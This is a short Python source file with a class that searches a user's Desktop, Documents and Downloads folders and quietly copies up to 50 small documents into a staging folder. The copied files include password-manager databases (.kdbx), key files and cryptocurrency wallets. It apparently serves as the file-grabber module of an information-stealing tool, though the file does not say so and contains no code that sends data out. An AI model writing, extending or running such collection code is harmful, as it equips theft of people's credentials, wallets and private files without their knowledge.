import os
import shutil
import logging


class CommonFiles:
    EXTENSIONS = ('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv',
                  '.rtf', '.odt', '.pptx', '.kdbx', '.key', '.wallet')
    SEARCH_DIRS = [
        os.path.join(os.path.expanduser('~'), 'Desktop'),
        os.path.join(os.path.expanduser('~'), 'Documents'),
        os.path.join(os.path.expanduser('~'), 'Downloads'),
    ]
    MAX_FILE_SIZE = 2 * 1024 * 1024  # 2MB
    MAX_FILES = 50

    _log = logging.getLogger('CommonFiles')

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'CommonFiles')
        os.makedirs(out, exist_ok=True)
        copied = 0

        for search_dir in cls.SEARCH_DIRS:
            if not os.path.isdir(search_dir):
                continue

            for root, dirs, files in os.walk(search_dir):
                # Skip hidden / system directories
                dirs[:] = [d for d in dirs if not d.startswith('.') and
                           d.lower() not in ('node_modules', '.git', '__pycache__', 'venv')]

                if copied >= cls.MAX_FILES:
                    break

                for fname in files:
                    if copied >= cls.MAX_FILES:
                        break

                    _, ext = os.path.splitext(fname)
                    if ext.lower() not in cls.EXTENSIONS:
                        continue

                    src_path = os.path.join(root, fname)
                    try:
                        fsize = os.path.getsize(src_path)
                        if fsize > cls.MAX_FILE_SIZE or fsize == 0:
                            continue

                        # Preserve relative path from the search dir parent
                        rel = os.path.relpath(src_path, os.path.expanduser('~'))
                        dst_path = os.path.join(out, rel)
                        os.makedirs(os.path.dirname(dst_path), exist_ok=True)

                        shutil.copy2(src_path, dst_path)
                        copied += 1
                    except Exception as e:
                        cls._log.debug(f'Failed to copy {src_path}: {e}')

        cls._log.info(f'Copied {copied} common file(s) to {out}')
